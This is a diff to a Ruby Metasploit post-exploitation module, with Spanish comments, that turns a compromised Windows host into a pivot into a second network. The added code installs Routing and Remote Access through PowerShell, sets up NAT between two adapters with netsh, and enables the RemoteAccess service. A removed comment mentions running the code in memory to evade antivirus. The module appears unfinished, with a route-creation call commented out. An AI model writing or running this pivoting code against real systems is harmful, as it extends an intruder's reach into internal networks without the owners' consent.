@@ -33,8 +33,8 @@ class MetasploitModule < Msf::Post
 		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
 		OptAddressRange.new('NET',    [true, 'The network we want to arrive (Example: 10.0.0.0/24)']),
 		OptAddress.new('RHOST',    [true, 'IP address of pivot computer (our side IP)']),
-		OptString.new('NInt01', [true, 'Name of pivot network adapter of our network']),
-		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network']),
+		OptString.new('NInt01', [true, 'Name of pivot network adapter of our network. Explample: "eth0", "Ethernet 2"...']),
+		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network. Explample: "eth1", "Ethernet", "tap0"...']),
       ])
   end
 	#Obtenemos el OS de instalacion de metasploit
@@ -99,24 +99,24 @@ class MetasploitModule < Msf::Post
 			else
 				print_good("	IP Routing is Enabled.")
 			end
-			# el comando netsh interface show interface muestra las interfaces
+			
 			# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
-			if have_powershell?
-				# Para Windows Vista, 7, 8, 8.1 y 10 se hace compartiendo conexión de red en las propiedades del adaptador.
-				# De igual manera se hace con los TAP (VPN)
-				# Hacerlo ejecutandolo en memoria para evadir AV
-
-			else
-				# if windows 2008 --> Instalar rol de acceso remoto
-				# https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc732263(v=ws.11)#BKMK_cmd
-				# if Windows Servers o XP
-				# De igual manera se hace para los TAP (VPN)
-					# print_status(cmd_exec("netsh routing ip nat install"))
-					# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
-					# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
-				# else
-					# print_bad("Powershell is not installed. The operations can't be done.")
-			end
+			# ¿Es Windows Vista, 7, 8, 8.1 o 10?
+			# 	Fin del módulo
+			# ¿Es windows 2008,2012 o 2016?
+				if have_powershell?
+					print_status("Powershell is installed. Trying to install the services.")
+					
+					# Ejecutar en powershell: Import-Module Servermanager ; Add-WindowsFeature NPAS-RRAS-Services
+					print_status(psh_exec("Import-Module Servermanager; Add-WindowsFeature NPAS-RRAS-Services"))
+					
+				else
+					print_bad("Powershell is not installed. The operations can't be done.")
+					# Exit del modulo
+				end
+			print_status(cmd_exec("netsh routing ip nat install"))
+			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
+			print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
 			
 			print_status("	Enabling Routing and Remote Access service...")
 			if service_change_startup("RemoteAccess",2)
@@ -242,8 +242,9 @@ class MetasploitModule < Msf::Post
 			# print_status("OS: #{session.sys.config.sysinfo['OS']}")
 			# print_status("Computer name: #{'Computer'} ")
 			# print_status("Current user: #{session.sys.config.getuid}")
-			t_pivot()
-			create_route()
+			
+			set_pivot()
+			# create_route()
 			# para saber si las rutas son correctas
 			# print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
 			# print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
